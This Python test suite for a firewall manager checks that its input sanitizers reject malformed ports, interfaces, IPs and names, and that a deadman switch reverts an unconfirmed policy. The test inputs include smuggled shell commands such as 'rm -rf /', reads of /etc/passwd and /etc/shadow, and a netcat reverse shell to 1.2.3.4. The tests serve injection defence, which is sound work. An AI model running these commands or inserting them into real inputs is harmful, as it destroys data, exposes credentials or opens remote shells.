"""Security and adversarial test suite for firewall manager.

Tests boundary limits, input sanitization against shell injection,
path traversal, malformed IP ranges, and unconfirmed safety auto-reversion.
"""

import time

import pytest
from pydantic import ValidationError

from fwmanager.core.executor import SimulationDriver
from fwmanager.core.sanitizer import (
    sanitize_identifier,
    sanitize_interface,
    sanitize_ip_or_cidr,
    sanitize_port_or_range,
)
from fwmanager.models.rules import FirewallPolicy, FirewallRule
from fwmanager.safety.deadman_switch import DeadmanSwitch


@pytest.mark.parametrize(
    "injected_port",
    [
        "80; rm -rf /",
        "80 && echo pwned",
        "$(whoami)",
        "`reboot`",
        "80 | cat /etc/passwd",
        "-1",
        "0",
        "65536",
        "99999",
        "80:90:100",
        "abc",
        "80\n90",
    ],
)
def test_port_injection_defense(injected_port: str) -> None:
    """Ensure command injection and malformed values in port are rejected."""
    with pytest.raises((ValueError, ValidationError)):
        sanitize_port_or_range(injected_port)

    with pytest.raises(ValidationError):
        FirewallRule(chain="INPUT", port=injected_port, action="ACCEPT")


@pytest.mark.parametrize(
    "injected_interface",
    [
        "eth0; reboot",
        "eth0 && rm -rf",
        "../../dev/null",
        "eth0/1",
        "lo; nc -e /bin/sh 1.2.3.4 4444",
        "eth0`id`",
        "$IFACE",
        "a" * 17,  # Max Linux IFNAMSIZ is 16 including null terminator
    ],
)
def test_interface_injection_defense(injected_interface: str) -> None:
    """Ensure network interface parameters reject metacharacters and directory traversal."""
    with pytest.raises((ValueError, ValidationError)):
        sanitize_interface(injected_interface)

    with pytest.raises(ValidationError):
        FirewallRule(chain="INPUT", interface_in=injected_interface, action="ACCEPT")


@pytest.mark.parametrize(
    "malformed_ip",
    [
        "999.999.999.999",
        "192.168.1.1/33",
        "192.168.1.1; ls",
        "10.0.0.1 && cat /etc/shadow",
        "fe80:::1",
        "not-an-ip",
        "10.0.0.0/8/16",
    ],
)
def test_ip_cidr_sanitization_defense(malformed_ip: str) -> None:
    """Ensure source and dest IP fields strictly reject malformed addresses and injections."""
    with pytest.raises((ValueError, ValidationError)):
        sanitize_ip_or_cidr(malformed_ip)

    with pytest.raises(ValidationError):
        FirewallRule(chain="INPUT", source_ip=malformed_ip, action="ACCEPT")


@pytest.mark.parametrize(
    "bad_identifier",
    [
        "chain; rm -rf",
        "TABLE&whoami",
        "name with spaces",
        "table/name",
        "a" * 65,
    ],
)
def test_identifier_sanitization_defense(bad_identifier: str) -> None:
    """Ensure table and chain names reject special characters and excessive lengths."""
    with pytest.raises((ValueError, ValidationError)):
        sanitize_identifier(bad_identifier)


def test_deadman_switch_timeout_auto_revert_defense() -> None:
    """Verify that an unconfirmed policy automatically reverts upon timeout expiry."""
    driver = SimulationDriver()
    switch = DeadmanSwitch()

    initial_policy = FirewallPolicy(name="base_safe_state")
    initial_policy.add_rule(
        FirewallRule(id="safe-1", chain="INPUT", protocol="tcp", port="22", action="ACCEPT")
    )
    driver.apply_policy(initial_policy)

    risky_policy = FirewallPolicy(name="risky_staged_state")
    risky_policy.add_rule(
        FirewallRule(id="risk-1", chain="INPUT", protocol="tcp", port="80", action="DROP")
    )

    def _revert(snapshot: FirewallPolicy) -> None:
        driver.apply_policy(snapshot)

    # Arm with very short timeout (1 second)
    switch.arm(
        current_policy=initial_policy,
        pending_policy=risky_policy,
        revert_callback=_revert,
        timeout=1,
    )
    driver.apply_policy(risky_policy)

    # Verify risky policy is currently active in memory
    active_now = driver.get_active_policy()
    assert active_now is not None
    assert active_now.name == "risky_staged_state"
    assert switch.get_status().is_armed is True

    # Sleep past timeout without confirming
    time.sleep(1.2)

    # Query status which triggers timer check and revert
    status = switch.get_status()
    assert status.is_armed is False
    assert status.reverted is True

    # Verify driver was restored to base_safe_state
    restored = driver.get_active_policy()
    assert restored is not None
    assert restored.name == "base_safe_state"
    assert len(restored.rules) == 1
    assert restored.rules[0].port == "22"
